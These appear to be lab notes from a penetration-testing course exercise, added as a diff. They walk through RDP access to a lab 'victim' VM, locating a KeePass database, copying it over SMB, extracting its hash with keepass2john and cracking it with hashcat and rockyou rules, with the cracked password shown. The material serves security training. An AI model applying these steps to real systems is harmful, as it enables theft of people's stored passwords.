@@ -1,0 +1,37 @@
+Questions 1
+Follow the steps outlined in this section to obtain the master password of the KeePass database on VM #1 (SALESWK01). Enter the password found with the title "User Company Password".
+
+# RDP into the victim pc
+xfreerdp /u:jason /p:lab /v:192.168.190.203 /drive:smbfolder,/home/kali/Desktop
+
+# Open Powershell retrieve *.kdbx file 
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+Transfer the .kdbx file to our Kali system using SMB 
+
+We have now completed the first step of the cracking methodology and can proceed to the next step, transforming the hash into a format our cracking tool can use.
+JohntheRipper suite includes various transformation scripts like ssh2john4 and keepass2john,5 which can format a broad range of different file formats
+
+# Here will keepass2john script to format the database file
+keepass2john Database.kdbx > keepass.hash
+
+
+# here the output of the hash will see the 'Database:$keepass$...' which 'Database:' is not needed
+cat keepass.hash
+nano keepass.hash # remove database prefix
+cat keepass.hash # make sure the prefix is removed
+
+# Find the hash type for KeePass. We can lookup it in the Hashcat Wiki
+hashcat --help | grep -i "KeePass"
+13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)         | Password Manager
+
+# We'll use one of the Hashcat-provided rules (rockyou-30000.rule), as mentioned earlier, combined with the rockyou.txt wordlist.
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+...
+...63ee920277496c1:qwertyuiop123!
+...
+
+Back to the Victim machine open the .kdbx file and use the password above. 
+User company password found!
+
+
